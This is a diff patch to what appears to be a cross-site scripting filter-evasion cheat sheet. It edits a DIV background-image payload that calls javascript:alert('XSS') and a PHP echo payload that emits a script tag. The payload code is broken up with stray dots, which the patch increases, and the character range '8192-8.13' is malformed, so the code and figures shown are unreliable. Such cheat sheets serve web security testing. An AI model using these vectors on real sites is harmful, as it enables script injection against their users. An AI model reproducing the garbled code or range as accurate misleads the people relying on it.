@@ -906,7 +906,7 @@ DIV Background-image Plus Extra Characters
 Rnaske built a quick XSS fuzzer to detect any erroneous characters that are allowed after the open parenthesis but before the JavaScript directive in IE and Netscape 8.1 in secure site mode. These are in decimal but you can include hex and add padding of course. (Any of the following chars can be used: 1-32, 34, 39, 160, 8192-8.13, 12288, 65279):
 
 ```py
-<...DI..V ST...YLE=..."back...ground-image: ur...l(ja...va...script:ale...rt('X...SS'))">
+<...DI..V ST...YLE=..."ba..ck...gro..und-ima....ge: ur...l(ja...va...scr...ipt.:.ale...rt('X...SS'))">
 ```
 
 DIV Expression
@@ -1007,7 +1007,7 @@ This requires SSI to be installed on the server to use this XSS vector. I probab
 PHP
 Requires PHP to be installed on the server to use this XSS vector. Again, if you can run any scripts ## remotely like this, there are probably much more dire issues:
 
-``` 
+```
 <? echo('<SCR)';
 echo('IPT>alert("XSS")</SCRIPT>'); ?>
 ```
